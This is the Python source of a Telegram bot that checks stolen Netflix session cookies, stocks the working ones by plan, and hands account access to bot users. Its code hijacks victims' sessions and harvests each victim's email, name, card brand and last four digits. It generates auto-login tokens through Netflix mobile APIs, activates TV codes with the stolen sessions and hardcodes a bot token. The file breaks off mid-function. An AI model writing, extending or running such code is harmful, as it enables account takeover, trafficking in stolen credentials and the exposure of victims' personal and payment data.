#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Netflix Cookie Checker + Login Bot (pure Bot API)
- All users: check cookies, get hits TXT by plan, nftoken login links
- Admin: upload stock cookies to store, manage users
- Users: Get Login (PC/Mobile/TV) — pick plan → nftoken links OR TV code activate
- Daily link limits for users
"""

from __future__ import annotations

import sys
try:
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass

import os
import re
import io
import json
import time
import zipfile
import hashlib
import logging
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, date
from threading import Lock
from typing import Dict, List, Optional, Tuple, Any

import requests
from requests.exceptions import RequestException, ConnectionError
from http.client import RemoteDisconnected
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════ CONFIG ═══════════════════
# Railway / host env (prefer explicit vars, fallback to baked defaults)
BOT_TOKEN = (
    os.environ.get("NETFLIX_CHECKER_BOT_TOKEN")
    or os.environ.get("BOT_TOKEN")
    or os.environ.get("TELEGRAM_BOT_TOKEN")
    or "8888404290:AAGgssKfDjTV_ZETlxK02Aaw_om2Ra6jrGg"
)
ADMIN_IDS = [
    int(x)
    for x in os.environ.get("ADMIN_IDS", "7200716402").split(",")
    if x.strip().isdigit()
]
MAX_THREADS = int(os.environ.get("MAX_THREADS", "15"))
MAX_RETRIES = 3
REQUEST_TIMEOUT = 18
DAILY_LINK_LIMIT = int(os.environ.get("DAILY_LINK_LIMIT", "5"))  # per user
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nfc_bot_data")
os.makedirs(DATA_DIR, exist_ok=True)
STORE_FILE = os.path.join(DATA_DIR, "cookie_store.json")
USAGE_FILE = os.path.join(DATA_DIR, "usage.json")
PENDING_FILE = os.path.join(DATA_DIR, "pending.json")

UA_WEB = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
log = logging.getLogger("nfc_bot")

_session = requests.Session()
_file_lock = Lock()
user_jobs: Dict[int, dict] = {}
jobs_lock = Lock()
live_hits: Dict[int, List[dict]] = {}
hits_lock = Lock()
# user_id -> waiting state: None | "tv_code" | "admin_upload"
pending_state: Dict[int, dict] = {}
state_lock = Lock()


# ═══════════════════ STORAGE ═══════════════════
def _load(path, default):
    with _file_lock:
        if not os.path.exists(path):
            return default
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default


def _save(path, data):
    with _file_lock:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)


def load_store() -> dict:
    data = _load(STORE_FILE, {"premium": [], "standard": [], "basic": [], "mobile": [], "other": []})
    for k in ("premium", "standard", "basic", "mobile", "other"):
        data.setdefault(k, [])
    return data


def save_store(data):
    _save(STORE_FILE, data)


def load_usage() -> dict:
    return _load(USAGE_FILE, {})


def save_usage(data):
    _save(USAGE_FILE, data)


def user_daily_count(uid: int) -> int:
    usage = load_usage()
    key = str(uid)
    today = date.today().isoformat()
    u = usage.get(key) or {}
    if u.get("day") != today:
        return 0
    return int(u.get("count", 0))


def inc_user_daily(uid: int) -> int:
    usage = load_usage()
    key = str(uid)
    today = date.today().isoformat()
    u = usage.get(key) or {}
    if u.get("day") != today:
        u = {"day": today, "count": 0}
    u["count"] = int(u.get("count", 0)) + 1
    usage[key] = u
    save_usage(usage)
    return u["count"]


def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


# ═══════════════════ TELEGRAM ═══════════════════
def api(method, data=None, files=None, timeout=60):
    try:
        if files:
            r = _session.post(f"{API}/{method}", data=data or {}, files=files, timeout=timeout)
        else:
            r = _session.post(f"{API}/{method}", json=data or {}, timeout=timeout)
        return r.json()
    except Exception as e:
        log.error("API %s: %s", method, e)
        return {"ok": False}


def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    payload = {"chat_id": chat_id, "text": text[:4090], "parse_mode": parse_mode, "disable_web_page_preview": True}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    j = api("sendMessage", payload)
    return j["result"]["message_id"] if j.get("ok") else None


def edit_message(chat_id, message_id, text, reply_markup=None):
    payload = {
        "chat_id": chat_id, "message_id": message_id, "text": text[:4090],
        "parse_mode": "HTML", "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return bool(api("editMessageText", payload).get("ok"))


def delete_message(chat_id, message_id):
    api("deleteMessage", {"chat_id": chat_id, "message_id": message_id})


def answer_callback(cq_id, text=""):
    api("answerCallbackQuery", {"callback_query_id": cq_id, "text": text[:200]})


def send_document(chat_id, file_bytes, filename, caption="", reply_markup=None):
    data = {"chat_id": str(chat_id), "caption": caption[:1020], "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    api("sendDocument", data, files={"document": (filename, file_bytes)}, timeout=120)


def download_file(file_id):
    j = api("getFile", {"file_id": file_id})
    if not j.get("ok"):
        return None
    path = j["result"].get("file_path")
    if not path:
        return None
    try:
        r = _session.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}", timeout=120)
        r.raise_for_status()
        return r.content
    except Exception:
        return None


def kb(rows):
    return {"inline_keyboard": rows}


def btn(text, data):
    return {"text": text, "callback_data": data}


def reply_kb(rows, resize=True, one_time=False):
    return {"keyboard": rows, "resize_keyboard": resize, "one_time_keyboard": one_time}


def remove_kb():
    return {"remove_keyboard": True}


# ═══════════════════ COOKIE / CHECK ═══════════════════
def _djs(s):
    if not s:
        return s
    s = re.sub(r"\\x([0-9A-Fa-f]{2})", lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r"\\u([0-9A-Fa-f]{4})", lambda m: chr(int(m.group(1), 16)), s)
    return s


def _rx(pattern, text, default=""):
    m = re.search(pattern, text)
    return m.group(1) if m else default


def netscape_to_list(content: str) -> list:
    cookies = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        fields = line.split("\t")
        if len(fields) >= 7:
            cookies.append({
                "domain": fields[0].replace("www", ""), "path": fields[2],
                "secure": fields[3].upper() == "TRUE", "expiration": fields[4],
                "name": fields[5], "value": fields[6],
            })
    return cookies


def parse_cookie_file(raw: bytes, filename: str = "") -> Optional[list]:
    """Robust extractor: json list, netscape, header string, mixed blocks."""
    try:
        text = raw.decode("utf-8", errors="ignore").strip()
        if not text:
            return None
        # JSON array / object
        try:
            data = json.loads(text)
            if isinstance(data, list):
                out = [c for c in data if isinstance(c, dict) and "name" in c and "value" in c]
                if out:
                    return out
            if isinstance(data, dict):
                if "name" in data and "value" in data:
                    return [data]
                # { "NetflixId": "...", "SecureNetflixId": "..." }
                if any(k in data for k in ("NetflixId", "SecureNetflixId")):
                    cookies = []
                    for k, v in data.items():
                        if isinstance(v, (str, int, float)):
                            cookies.append({"domain": ".netflix.com", "path": "/", "name": str(k), "value": str(v), "secure": True})
                    if cookies:
                        return cookies
        except json.JSONDecodeError:
            pass

        # Netscape multi-block
        if "\t" in text:
            blocks = re.split(r"\n\s*\n+", text)
            all_c = []
            for block in blocks:
                c = netscape_to_list(block)
                if c:
                    all_c.extend(c)
            if all_c:
                # if multiple independent cookie sets in one file, caller may split;
                # return combined if single set markers
                names = {c["name"] for c in all_c}
                if "NetflixId" in names or "SecureNetflixId" in names:
                    return all_c
            c = netscape_to_list(text)
            if c:
                return c

        # Header / export style
        if "NetflixId=" in text or "SecureNetflixId=" in text or "NetflixId :" in text:
            cookies = []
            # key=value pairs separated by ; or newlines
            cleaned = text.replace("NetflixId :", "NetflixId=").replace("SecureNetflixId :", "SecureNetflixId=")
            for part in re.split(r"[;\n]", cleaned):
                part = part.strip().strip(",")
                if "=" in part:
                    k, _, v = part.partition("=")
                    k, v = k.strip().strip('"'), v.strip().strip('"').strip(",")
                    if k and v and not k.startswith("#") and len(k) < 80:
                        cookies.append({"domain": ".netflix.com", "path": "/", "name": k, "value": v, "secure": True})
            if any(c["name"] in ("NetflixId", "SecureNetflixId") for c in cookies):
                return cookies

        # EditThisCookie / browser export lines without tabs
        if "netflix.com" in text.lower() and "\t" not in text:
            cookies = []
            for m in re.finditer(r'(NetflixId|SecureNetflixId|nfvdid|NetflixIdSecure)\s*[=:]\s*([^\s;,"]+)', text, re.I):
                cookies.append({"domain": ".netflix.com", "path": "/", "name": m.group(1), "value": m.group(2), "secure": True})
            if cookies:
                return cookies
        return None
    except Exception:
        return None



def cookies_to_dict(cookies: list) -> dict:
    return {str(c["name"]): str(c["value"]) for c in cookies if isinstance(c, dict) and "name" in c and "value" in c}


def cookies_to_header(cookies: list) -> str:
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies if isinstance(c, dict) and "name" in c)


def cookie_fingerprint(cookies: list) -> str:
    parts = []
    for c in cookies:
        if isinstance(c, dict) and "name" in c and "value" in c:
            parts.append(f"{c['name']}={c['value']}")
    return hashlib.sha256("\n".join(sorted(parts)).encode()).hexdigest() if parts else ""


def normalize_plan(plan: str) -> str:
    p = (plan or "").lower()
    if "premium" in p:
        return "premium"
    if "standard" in p and "ads" in p:
        return "standard"
    if "standard" in p:
        return "standard"
    if "basic" in p:
        return "basic"
    if "mobile" in p:
        return "mobile"
    return "other"



# ── nftoken (ios FTL + android graphql — proven generator) ──
_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {
    "appVersion": "15.48.1",
    "config": (
        '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false",'
        '"cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true",'
        '"billboardEnabled":"true","sharksEnabled":"true",'
        '"useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}'
    ),
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
_IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.context.pixel-density": "2.0",
}


def _cookie_header_from_ids(netflix_id: str, secure_id: str | None = None, extra: dict | None = None) -> str:
    parts = [f"NetflixId={netflix_id}"]
    if secure_id:
        parts.append(f"SecureNetflixId={secure_id}")
    if extra:
        for k in ("nfvdid", "SecureNetflixId", "NetflixId"):
            if k in extra and extra[k] and k not in ("NetflixId", "SecureNetflixId"):
                parts.append(f"{k}={extra[k]}")
            elif k == "SecureNetflixId" and extra.get(k) and not secure_id:
                parts.append(f"{k}={extra[k]}")
    return "; ".join(parts)


def generate_nftoken(
    netflix_id_raw,
    timeout=20,
    secure_id: str | None = None,
    extra_cookies: dict | None = None,
) -> Optional[str]:
    """Generate auto-login token. Returns RAW token string (do not pre-encode)."""
    if not netflix_id_raw:
        return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    secure = urllib.parse.unquote(str(secure_id)) if secure_id else None
    if extra_cookies and not secure:
        secure = extra_cookies.get("SecureNetflixId")
        if secure:
            secure = urllib.parse.unquote(str(secure))

    cookie_hdr = _cookie_header_from_ids(netflix_id, secure, extra_cookies)

    # Method 1: iOS FTL path account.token.default (most reliable)
    try:
        headers = dict(_IOS_HEADERS)
        headers["Cookie"] = cookie_hdr
        r = requests.get(
            _IOS_API,
            params=_IOS_PARAMS,
            headers=headers,
            timeout=timeout,
            verify=False,
        )
        if r.status_code == 200:
            data = r.json()
            token_data = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            tok = token_data.get("token")
            if tok:
                return str(tok)
    except Exception as e:
        log.debug("ios nftoken fail: %s", e)

    # Method 2: Android CreateAutoLoginToken graphql
    try:
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {
                "persistedQuery": {
                    "version": 102,
                    "id": "76e97129-f4b5-41a0-a73c-12e674896849",
                }
            },
        }
        r2 = requests.post(
            "https://android13.prod.ftl.netflix.com/graphql",
            json=payload,
            headers={
                "User-Agent": UA_ANDROID,
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Cookie": cookie_hdr,
            },
            timeout=timeout,
            verify=False,
        )
        if r2.status_code == 200:
            d = r2.json()
            tok = (d.get("data") or {}).get("createAutoLoginToken")
            if tok:
                return str(tok)
    except Exception as e:
        log.debug("android nftoken fail: %s", e)

    return None


def build_nftoken_links(tok: str) -> dict:
    """Build login URLs. Token is placed RAW in query (Netflix accepts + and / unencoded).
    Double-encoding breaks tokens and redirects to /login.
    """
    raw = str(tok).strip()
    # Minimal encode: only characters that break URLs
    safe = urllib.parse.quote(raw, safe="+/=-_.*")
    web_pc = f"https://netflix.com/?nftoken={safe}"
    web_mobile = f"https://netflix.com/unsupported?nftoken={safe}"
    intent = (
        "intent://netflix.com/unsupported?nftoken=" + safe
        + "#Intent;scheme=https;package=com.netflix.mediaclient;"
        + "S.browser_fallback_url=" + urllib.parse.quote(web_mobile, safe="")
        + ";end"
    )
    return {
        "pc": web_pc,
        "mobile": intent,
        "mobile_web": web_mobile,
        "tv": f"https://netflix.com/tv2?nftoken={safe}",
        "home": web_pc,
        "raw_token": raw,
    }



def check_one_cookie(cookies: list, label: str = "", need_token: bool = False) -> dict:
    result = {
        "status": "error", "plan": None, "plan_key": "other", "email": None, "country": None,
        "extra_members": False, "cookies": cookies, "label": label, "error": None,
        "name": None, "price": None, "login_pc": None, "login_mobile": None, "login_tv": None,
        "netflix_id": None, "token": None,
    }
    jar = cookies_to_dict(cookies)
    if not any(jar.get(k) for k in ("NetflixId", "SecureNetflixId")):
        result["status"] = "expired"
        result["error"] = "missing NetflixId"
        return result

    session = requests.Session()
    session.trust_env = False
    session.verify = False
    session.headers.update({
        "User-Agent": UA_WEB,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",
        "DNT": "1",
    })
    for k, v in jar.items():
        session.cookies.set(k, v, domain=".netflix.com", path="/")

    last_err = None
    for attempt in range(MAX_RETRIES):
        try:
            resp = session.get("https://www.netflix.com/account", timeout=REQUEST_TIMEOUT, allow_redirects=True)
            url_l = (resp.url or "").lower()
            if "login" in url_l or resp.status_code in (401, 403):
                result["status"] = "expired"
                result["error"] = "login redirect"
                return result
            html = resp.text or ""
            if '"membershipStatus":"CURRENT_MEMBER"' not in html:
                if not ("/account" in url_l and re.search(r'"emailAddress"', html)):
                    result["status"] = "expired"
                    result["error"] = "not CURRENT_MEMBER"
                    return result

            email = _djs(_rx(r'"emailAddress"\s*:\s*"([^"]+)"', html)) or "Unknown"
            country = _rx(r'"countryOfSignup"\s*:\s*"([A-Z]{2,3})"', html, "XX")
            plan = _djs(_rx(
                r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html
            ))
            if not plan:
                for c in ("Premium", "Standard with ads", "Standard", "Basic", "Mobile"):
                    if c in html:
                        plan = c
                        break
            plan = plan or "Unknown"
            plan_key = normalize_plan(plan)
            price = _djs(_rx(r'"planPrice"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html))
            extra_raw = _rx(r'"extraMemberSlots"\s*:\s*\{\s*"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*(\d+)', html, "0")
            extra = int(extra_raw) > 0 if extra_raw.isdigit() else False
            name = _djs(_rx(r'"userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"', html)) or _djs(_rx(r'"firstName"\s*:\s*"([^"]+)"', html))

            # payment / billing extras
            _pm = html[html.find('"paymentMethods"'):html.find('"paymentMethods"') + 3500] if '"paymentMethods"' in html else ""
            card_brand = _rx(r'"paymentOptionLogo"\s*:\s*"([^"]+)"', _pm) or _rx(
                r'"type"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', _pm
            )
            pay_type = _rx(r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', _pm)
            card_last4 = _rx(r'"displayText"\s*:\s*"([^"]+)"', _pm) or _rx(
                r'"displayText"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', _pm
            )
            nextbill = _djs(_rx(r'"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html))
            streams = _rx(r'"maxStreams"\s*:\s*\{\s*"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*(\d+)', html)
            q_raw = _rx(r'"videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html).upper()
            quality_map = {"UHD": "uhd 4k", "FHD": "fhd 1080p", "HD": "hd 720p", "SD": "sd 480p"}
            quality = quality_map.get(q_raw, q_raw.lower() if q_raw else None)

            nid = jar.get("NetflixId") or jar.get("SecureNetflixId")
            result.update({
                "status": "working", "plan": plan, "plan_key": plan_key, "email": email,
                "country": country, "extra_members": extra, "name": name, "price": price,
                "netflix_id": nid, "error": None,
                "card_brand": card_brand or None,
                "pay_type": pay_type or None,
                "card_last4": card_last4 or None,
                "next_billing": nextbill or None,
                "max_streams": streams or None,
                "video_quality": quality,
            })
            if need_token and nid:
                tok = generate_nftoken(nid)
                if tok:
                    links = build_nftoken_links(tok)
                    result["token"] = tok
                    result["login_pc"] = links["pc"]
                    result["login_mobile"] = links["mobile"]
                    result["login_mobile_web"] = links.get("mobile_web") or links["mobile"]
                    result["login_tv"] = links["tv"]
            return result
        except (RequestException, ConnectionError, RemoteDisconnected) as e:
            last_err = str(e)
            time.sleep(0.35 + attempt * 0.3)
        except Exception as e:
            result["error"] = str(e)
            return result
    result["status"] = "error"
    result["error"] = last_err or "max retries"
    return result


def activate_tv_code(cookie_header_or_list, code: str) -> Tuple[bool, str]:
    """Activate Netflix TV code with cookie session. Accepts 4728-4829 style codes."""
    code = re.sub(r"[^A-Za-z0-9]", "", code or "").upper()
    if len(code) < 4 or len(code) > 12:
        return False, "invalid code — send only the tv code like 5483-4792"

    if isinstance(cookie_header_or_list, list):
        jar = cookies_to_dict(cookie_header_or_list)
        cookie_hdr = cookies_to_header(cookie_header_or_list)
    else:
        cookie_hdr = str(cookie_header_or_list)
        jar = {}
        for part in cookie_hdr.split(";"):
            if "=" in part:
                k, _, v = part.partition("=")
                jar[k.strip()] = v.strip()

    if not jar.get("NetflixId") and not jar.get("SecureNetflixId"):
        return False, "cookie missing NetflixId"

    sess = requests.Session()
    sess.verify = False
    sess.trust_env = False
    for k, v in jar.items():
        sess.cookies.set(k, v, domain=".netflix.com", path="/")

    headers = {
        "User-Agent": UA_WEB,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "https://www.netflix.com",
        "Referer": "https://www.netflix.com/tv2",
    }

    last_err = None
    for attempt in range(3):
        try:
            # warm session
            try:
                sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True)
            except Exception:
                pass

            r = sess.get("https://www.netflix.com/tv2", headers=headers, timeout=25, allow_redirects=True)
            html = r.text or ""
            auth = None
            for pat in [
                r'name="authURL"\s+value="([^"]+)"',
                r'authURL"\s*value="([^"]+)"',
                r'"authURL"\s*:\s*"([^"]+)"',
                r"authURL['\"]?\s*[:=]\s*['\"]([^'\"]+)",
            ]:
                m = re.search(pat, html)
                if m:
                    auth = m.group(1)
                    break
            if not auth:
                r = sess.get("https://www.netflix.com/tv8", headers=headers, timeout=20, allow_redirects=True)
                html = r.text or ""
                for pat in [
                    r'name="authURL"\s+value="([^"]+)"',
                    r'authURL"\s*value="([^"]+)"',
                    r'"authURL"\s*:\s*"([^"]+)"',
                ]:
                    m = re.search(pat, html)
                    if m:
                        auth = m.group(1)
                        break
            if not auth:
                if "login" in (r.url or "").lower():
                    return False, "cookie dead — redirected to login"
                last_err = "could not extract authURL"
                time.sleep(0.8)
                continue

            payload = {
                "flow": "websiteSignUp",
                "authURL": auth,
                "flowMode": "login",
                "withFields": "code",
                "code": code,
                "isTvUrl2": "true",
                "action": "loginAction",
            }
            post_headers = dict(headers)
            post_headers["Content-Type"] = "application/x-www-form-urlencoded"
            post_headers["Referer"] = "https://www.netflix.com/tv2"
            r2 = sess.post(
                "https://www.netflix.com/tv2",
                data=payload,
                headers=post_headers,
                timeout=30,
                allow_redirects=True,
            )
            final = (r2.url or "").lower()
            body = (r2.text or "").lower()
            if any(x in final for x in ("/browse", "/tv/out/success", "/profiles", "success")):
                return True, "tv login done — check your tv"
            if "invalid" in body or "incorrect" in body:
                return False, "code invalid or expired — get a fresh code"
            if "expired" in body and "code" in body:
                return False, "code expired — get a new one on tv"
            if any(x in body for x in ("success", "activated", "signed in", "start watching", "you're in")):
                return True, "tv login done — check your tv"
            # soft success: many regions return 200 with no clear string
            if r2.status_code in (200, 302) and "login" not in final:
                return True, "code submitted — check your tv screen"
            last_err = f"unexpected response ({r2.status_code})"
        except (RequestException, ConnectionError, RemoteDisconnected) as e:
            last_err = str(e)[:120]
            time.sleep(1.0 + attempt)
        except Exception as e:
            last_err = str(e)[:120]
            time.sleep(0.8)
    return False, f"tv error: {last_err or 'failed'}"



# ═══════════════════ STORE ═══════════════════
def store_add_working(results: List[dict]) -> dict:
    """Add working hits to store. Returns counts per plan + total."""
    store = load_store()
    seen = set()
    for plan_list in store.values():
        for e in plan_list:
            if e.get("fp"):
                seen.add(e["fp"])
    counts = {"premium": 0, "standard": 0, "basic": 0, "mobile": 0, "other": 0}
    added = 0
    for h in results:
        if h.get("status") != "working":
            continue
        fp = cookie_fingerprint(h["cookies"])
        if fp and fp in seen:
            continue
        if fp:
            seen.add(fp)
        key = h.get("plan_key") or normalize_plan(h.get("plan", ""))
        if key not in store:
            key = "other"
        entry = {
            "id": fp[:16] if fp else hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            "fp": fp,
            "plan": key,
            "plan_name": h.get("plan"),
            "email": h.get("email"),
            "country": h.get("country"),
            "extra": h.get("extra_members"),
            "price": h.get("price"),
            "pay_type": h.get("pay_type"),
            "card_brand": h.get("card_brand"),
            "card_last4": h.get("card_last4"),
            "next_billing": h.get("next_billing"),
            "video_quality": h.get("video_quality"),
            "max_streams": h.get("max_streams"),
            "cookie_header": cookies_to_header(h["cookies"]),
            "cookies": h["cookies"],
            "added": datetime.utcnow().isoformat() + "Z",
            "used": 0,
        }
        store[key].append(entry)
        counts[key] = counts.get(key, 0) + 1
        added += 1
    save_store(store)
    counts["total"] = added
    return counts


def store_stats() -> str:
    store = load_store()
    lines = ["📦 <b>Cookie Store</b>\n"]
    total = 0
    for k in ("premium", "standard", "basic", "mobile", "other"):
        n = len(store.get(k, []))
        total += n
        lines.append(f"• {k.title()}: <b>{n}</b>")
    lines.append(f"\nTotal: <b>{total}</b>")
    return "\n".join(lines)


def take_from_store(plan_key: str, need_token: bool = True) -> Optional[dict]:
    """Pick least-used live cookie for plan (rotation — different users get different accounts)."""
    store = load_store()
    bucket = list(store.get(plan_key, []))
    if not bucket:
        return None
    # rotate: least used first, then oldest
    bucket.sort(key=lambda e: (int(e.get("used") or 0), e.get("added") or ""))
    dead = []
    winner = None
    for entry in bucket[:15]:
        cookies = entry.get("cookies")
        if not cookies:
            hdr = entry.get("cookie_header", "")
            cookies = parse_cookie_file(hdr.encode(), "store") or []
        res = check_one_cookie(cookies, entry.get("email") or "store", need_token=False)
        if res["status"] != "working":
            dead.append(entry["id"])
            continue
        real = res.get("plan_key") or plan_key
        if real != plan_key and real in store:
            entry2 = dict(entry)
            entry2["plan"] = real
            entry2["plan_name"] = res.get("plan")
            entry2["email"] = res.get("email")
            store[plan_key] = [e for e in store[plan_key] if e.get("id") != entry["id"]]
            store.setdefault(real, []).append(entry2)
            save_store(store)
            continue
        # generate token here with both ids
        if need_token:
            jar = cookies_to_dict(cookies)
            nid = jar.get("NetflixId") or res.get("netflix_id")
            sec = jar.get("SecureNetflixId")
            tok = None
            for _ in range(3):
                tok = generate_nftoken(nid, secure_id=sec, extra_cookies=jar)
                if tok:
                    break
                time.sleep(0.5)
            if tok:
                links = build_nftoken_links(tok)
                res["token"] = tok
                res["login_pc"] = links["pc"]
                res["login_mobile"] = links["mobile"]
                res["login_mobile_web"] = links.get("mobile_web") or links["mobile"]
                res["login_tv"] = links["tv"]
            res["netflix_id"] = nid
        winner = (entry, res)
        break
    if dead:
        store = load_store()
        store[plan_key] = [e for e in store.get(plan_key, []) if e.get("id") not in dead]
        save_store(store)
    if not winner:
        return None
    entry, res = winner
    store = load_store()
    for i, e in enumerate(store.get(plan_key, [])):
        if e.get("id") == entry["id"]:
            store[plan_key][i]["used"] = int(e.get("used") or 0) + 1
            store[plan_key][i]["email"] = res.get("email") or e.get("email")
            break
    save_store(store)
    return {"entry": entry, "check": res}



# ═══════════════════ UI ═══════════════════
def main_menu_kb(uid: int):
    rows = [
        [{"text": "🔍 Check Cookies"}, {"text": "🔗 Get Login"}],
        [{"text": "📺 TV Login"}, {"text": "🔥 Live Hits"}],
        [{"text": "📊 My Limit"}, {"text": "ℹ️ Help"}],
    ]
    if is_admin(uid):
        rows.append([{"text": "🛠 Admin Panel"}])
    return reply_kb(rows)


def admin_menu_kb():
    return reply_kb([
        [{"text": "📤 Upload Stock"}, {"text": "📦 Store Stats"}],
        [{"text": "🧹 Clear Store"}, {"text": "◀️ Main Menu"}],
    ])


def plan_inline(prefix: str):
    # one button per row = larger on mobile
    return kb([
        [btn("⭐  PREMIUM", f"{prefix}:premium")],
        [btn("📺  STANDARD", f"{prefix}:standard")],
        [btn("📱  BASIC", f"{prefix}:basic")],
        [btn("📲  MOBILE", f"{prefix}:mobile")],
        [btn("◀️  cancel", "cancel_action")],
    ])


def format_account_card(res: dict) -> str:
    extra = "yes" if res.get("extra_members") else "no"
    pay = res.get("pay_type") or res.get("card_brand") or "—"
    if res.get("card_last4"):
        pay = f"{pay} · {res.get('card_last4')}"
    lines = [
        "✅ <b>account ready</b>",
        f"<blockquote>email · {res.get('email') or '—'}</blockquote>",
        f"⭐ plan: <b>{res.get('plan') or '—'}</b>",
        f"🌍 country: <code>{res.get('country') or '—'}</code>",
        f"👤 name: {res.get('name') or '—'}",
        f"💰 price: {res.get('price') or '—'}",
        f"💳 payment: {pay}",
        f"🎬 quality: {res.get('video_quality') or '—'} · streams: {res.get('max_streams') or '—'}",
        f"📅 next bill: {res.get('next_billing') or '—'}",
        f"➕ extra: {extra}",
    ]
    if res.get("login_pc"):
        lines.append("<blockquote>tap buttons · mobile link works in browser · expires in ~2 hours</blockquote>")
    return "\n".join(lines)



def progress_bar(done, total, width=12):
    if total <= 0:
        return "░" * width
    filled = min(int(width * done / total), width)
    return "█" * filled + "░" * (width - filled)


def format_progress(done, total, working, expired, errors, current, elapsed):
    bar = progress_bar(done, total)
    pct = int(100 * done / total) if total else 0
    speed = done / elapsed if elapsed > 0.5 else 0
    eta = int((total - done) / speed) if speed > 0 else 0
    return (
        f"⚡ <b>Checking cookies</b>\n<code>[{bar}] {pct}%</code>\n\n"
        f"📦 {total}  ✅ {working}  ❌ {expired}  ⚠️ {errors}\n"
        f"⏱ {int(elapsed)}s | ETA {eta}s\n\n"
        f"🔎 <blockquote>{(current or '—')[:55]}</blockquote>"
    )


def load_cookies_from_upload(file_bytes, filename):
    """Load cookie sets. One file can yield many accounts."""
    items = []
    if filename.lower().endswith(".zip"):
